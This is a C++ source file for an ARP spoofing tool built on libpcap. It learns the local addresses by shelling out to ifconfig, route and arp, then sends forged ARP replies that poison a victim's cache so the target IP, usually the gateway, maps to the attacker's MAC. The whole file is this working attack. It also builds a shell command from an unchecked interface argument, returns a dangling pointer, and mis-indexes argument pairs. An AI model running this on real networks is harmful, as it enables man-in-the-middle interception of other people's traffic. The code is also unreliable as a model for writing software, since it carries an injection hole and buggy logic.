#include <cstdio>
#include <pcap.h>

#include <stdlib.h>
#include <string.h>


#include "ethhdr.h"
#include "arphdr.h"

#define MAX_STR_SIZE 2048

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: SendArp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: SendArp eth0 192.168.0.2 192.168.0.3\n");
}

char myMAC[MAX_STR_SIZE];
char myIP[MAX_STR_SIZE];

void getMyAddr(char* dev);
const char* getGatewayIP();
const char* getMACAddr(char *IP);
void sendARPRequest(char* dev, const char *gateway);
void sendARPReply(char* dev, char* sender_IP, char* target_IP);


int main(int argc, char* argv[]) {

    int i;
    int attackCase = 0;

    if (argc < 4 || argc%2!=0)
    {
        usage();
        return -1;
    }

    attackCase = (argc-2)/2;

    getMyAddr(argv[1]);

    const char* gatewayIP = getGatewayIP();


    sendARPRequest(argv[1],gatewayIP);

    for (i=0;i<attackCase;i++)
    {
        sendARPReply(argv[1],argv[2+i],argv[3+i]);
    }


}

void getMyAddr(char* dev)
{
    FILE *fp = NULL;
    char command[MAX_STR_SIZE]="ifconfig \0";
    strcat(command,dev);
    if((fp=popen(command,"r"))==NULL)
    {
        fprintf(stderr,"Failed to open cmd");
        exit(1);
    }

    char line[MAX_STR_SIZE]= "\0";
    char* ptr;
    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
    {
        ptr=strtok(line," ");
        while(ptr!=NULL)
        {
            if(!strcmp(ptr,"inet"))
            {
                ptr=strtok(NULL," ");
                strcpy(myIP,ptr);
            }
            if(!strcmp(ptr,"ether"))
            {
                ptr=strtok(NULL," ");
                strcpy(myMAC,ptr);
                break;
            }
            ptr=strtok(NULL," ");
        }

        if(ptr!=NULL)
            break;

    }
}

const char* getGatewayIP()
{
    FILE *fp = NULL;
    char line[MAX_STR_SIZE];
    char* ptr;

    if((fp=popen("route","r"))==NULL)
    {
       fprintf(stderr,"Failed to open cmd");
       exit(1);
    }
    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
    {
       ptr = strtok(line," ");
       if(!strcmp(ptr,"default"))
       {
           ptr=strtok(NULL," ");
           pclose(fp);
           return ptr;
        }
     }

     fprintf(stderr,"We couldn't find Gateway!");
     exit(1);

}

const char* getMACAddr(char *IP)
{

    FILE *fp = NULL;

    int len = strlen(IP);

    if((fp=popen("arp -an","r"))==NULL)
    {
        fprintf(stderr,"Failed to open cmd");
        pclose(fp);
        exit(1);
    }

    char line[MAX_STR_SIZE]= "\0";
    char* ptr;

    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
    {

        ptr = strtok(line," ");
        ptr = strtok(NULL," ");

        if(!strncmp((ptr+1),IP,len))
        {

            ptr = strtok(NULL," ");
            ptr = strtok(NULL," ");

            pclose(fp);

            ptr[17]='\0';

            return ptr;
         }

    }

    fprintf(stderr,"We couldn't find MAC!");
    pclose(fp);
    exit(1);

}

void sendARPRequest(char* dev, const char *target_IP)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(1);
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");           // broad
    packet.eth_.smac_ = Mac(myMAC);                // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(myMAC);                 //me
    packet.arp_.sip_ = htonl(Ip(myIP));        //me
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");            //unknown
    packet.arp_.tip_ = htonl(Ip(target_IP));        //gateway

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

void sendARPReply(char* dev, char* sender_IP, char* target_IP)
{

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(1);
    }

    EthArpPacket packet;
    sendARPRequest(dev,sender_IP);
    const char* sender_MAC = getMACAddr(sender_IP);
    packet.eth_.dmac_ = Mac(sender_MAC);           // you
    packet.eth_.smac_ = Mac(myMAC);                // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(myMAC);                 //me
    packet.arp_.sip_ = htonl(Ip(target_IP));        //gate
    packet.arp_.tmac_ = Mac(sender_MAC);            //you
    packet.arp_.tip_ = htonl(Ip(sender_IP));        //you

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

